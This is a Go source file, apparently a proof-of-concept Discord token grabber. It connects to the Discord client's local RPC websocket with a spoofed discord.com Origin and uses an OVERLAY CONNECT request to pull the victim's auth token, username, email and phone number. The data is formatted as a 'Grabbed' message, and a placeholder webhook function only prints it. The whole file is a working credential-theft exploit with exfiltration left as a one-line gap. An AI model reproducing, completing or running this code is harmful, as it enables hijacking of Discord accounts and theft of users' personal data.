package main

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/Jeffail/gabs"
	"github.com/gorilla/websocket"
)

var (
	socketURL   = "ws://127.0.0.1:6463/?v=1&encoding=json"
	headers     = http.Header{}
	payloadSend = false
	payload     string
	webhookURL  = "POC"
)

type sendReady struct {
	Cmd   string      `json:"cmd"`
	Args  interface{} `json:"args"`
	Evt   string      `json:"evt"`
	Nonce string      `json:"nonce"`
}

type connectArgs struct {
	Type string `json:"type"`
	Pid  int    `json:"pid"`
}

type connect struct {
	Cmd   string       `json:"cmd"`
	Args  *connectArgs `json:"args"`
	Nonce string       `json:"nonce"`
}

func sendWebhook() {
	fmt.Println(payload)
}

func main() {
	headers["Origin"] = []string{"https://discord.com"}
	var ready sendReady
	ready.Cmd = "SUBSCRIBE"
	ready.Evt = "OVERLAY"
	ready.Nonce = "test"

	var con = &connect{
		Cmd: "OVERLAY",
		Args: &connectArgs{
			Type: "CONNECT",
			Pid:  4,
		},
		Nonce: "test",
	}

	if c, _, err := websocket.DefaultDialer.Dial(socketURL, headers); err == nil {
		for {
			if payloadSend {
				break
			}
			if _, message, err := c.ReadMessage(); err == nil {
				jsonParsed, _ := gabs.ParseJSON(message)
				switch jsonParsed.Path("evt").String() {
				case "\"READY\"":
					c.WriteJSON(ready)
					c.WriteJSON(con)
					break
				default:
					if jsonParsed.Path("cmd").String() == "\"DISPATCH\"" && jsonParsed.Path("data.type").String() == "\"DISPATCH\"" && jsonParsed.Path("data.pid").String() == "4" {
						test, _ := jsonParsed.Path("data.payloads").ArrayElement(0)
						user, _ := test.Path("users").ArrayElement(0)
						if user.Path("discriminator").String() == "\"0000\"" {
							user, _ = test.Path("users").ArrayElement(1)
						}
						var token = test.Path("token").String()
						var userAndDiscrim = user.Path("username").String() + "#" + user.Path("discriminator").String()
						var email = user.Path("email").String()
						var phone = user.Path("phone").String()
						payload = strings.ReplaceAll(fmt.Sprintf("```Grabbed %v\nToken: %v\nPhone: %v\nEmail: %v```", userAndDiscrim, token, phone, email), "\"", "")
						payloadSend = true
					}
					break
				}
			}
		}
		c.Close()
	}
	sendWebhook()
}
